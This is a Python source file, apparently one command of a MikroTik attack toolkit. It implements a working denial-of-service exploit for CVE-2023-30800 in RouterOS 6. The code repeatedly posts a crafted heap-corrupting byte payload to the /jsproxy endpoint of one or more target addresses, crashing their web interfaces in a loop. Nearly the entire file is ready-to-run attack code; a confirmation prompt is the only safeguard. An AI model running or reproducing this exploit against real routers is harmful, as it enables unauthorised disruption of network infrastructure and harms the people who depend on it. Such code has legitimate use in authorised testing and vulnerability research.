# CVE-2023-30800
# The web server used by MikroTik RouterOS version 6 is affected
# by a heap memory corruption issue. A remote and unauthenticated
# attacker can corrupt the server's heap memory by sending a
# crafted HTTP request. As a result, the web interface crashes and
# is immediately restarted. The issue was fixed in RouterOS 6.49.10 stable.
# RouterOS version 7 is not affected.
# More information at: https://nvd.nist.gov/vuln/detail/CVE-2023-30800

from typing import Annotated

import httpx
import rich
import typer
from prompt_toolkit.shortcuts import yes_no_dialog

from mkx.core.colors import BOLD, GREEN, RESET, YELLOW
from mkx.core.helps import KILL_WEB_SERVER_HELP

DATA = b'\x00\x00\x00\x00\x00\x00\x00\x00\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e'

command = typer.Typer(
    help=KILL_WEB_SERVER_HELP,
    short_help='Attack that crashes the web interface of RouterOS versions 6 > 6.49.10 (CVE-2023-30800).',
    no_args_is_help=True,
    rich_markup_mode='markdown',
)


@command.callback(invoke_without_command=True)
def main(
    target: Annotated[
        str,
        typer.Argument(help='Target IP address or list of IP addresses and TCP ports.'),
    ],
    https: Annotated[
        bool,
        typer.Option('--https', '-s', help='Configure the attack for an https server.'),
    ] = False,
):
    """
    Attack that crashes the web interface of RouterOS versions 6 > 6.49.10.

    CVE-2023-30800

    The web server used by MikroTik RouterOS version 6 is affected by
    a heap memory corruption issue. A remote and unauthenticated attacker
    can corrupt the server's heap memory by sending a crafted HTTP request.
    As a result, the web interface crashes and is immediately restarted.
    The issue was fixed in RouterOS 6.49.10 stable.
    RouterOS version 7 is not affected.

    **Examples:**

    - mkx kill-web-server 172.16.0.123:80

    - mkx kill-web-server 172.16.0.123:80,172.16.0.124:80
    """
    confirm = yes_no_dialog(
        title='Confirm this action',
        text='Do you want to perform a kill web server attack?',
    ).run()

    if not confirm:
        print(f'{BOLD}{GREEN}[{RESET}{BOLD}{YELLOW}*{RESET}{BOLD}{GREEN}]{RESET} Aborting')
        return

    target = target.split(',')
    http = 'http'

    if https:
        http = 'https'

    rich.print(
        '[bold red][[/bold red]'
        '[bold yellow]+[/bold yellow]'
        '[bold red]][/bold red]'
        ' Performing web server crash attack...'
    )
    rich.print(
        '[bold red][[/bold red]'
        '[bold yellow]+[/bold yellow]'
        '[bold red]][/bold red]'
        ' Prees [bold red]Ctrl[/bold red]'
        '+[bold red]C[/bold red] to stop'
    )

    error = False
    while True:
        if error:
            break
        try:
            for ip in target:
                try:
                    httpx.post(
                        f'{http}://{ip}/jsproxy',
                        headers={'Content-Type': 'msg'},
                        data=DATA,
                    )
                except httpx.ConnectError:
                    rich.print(
                        '[bold red][[/bold red]'
                        '[bold yellow]*[/bold yellow]'
                        '[bold red]][/bold red]'
                        f' Unable to connect to host {ip}'
                    )
                    error = True
        except KeyboardInterrupt:
            break
    typer.Exit()
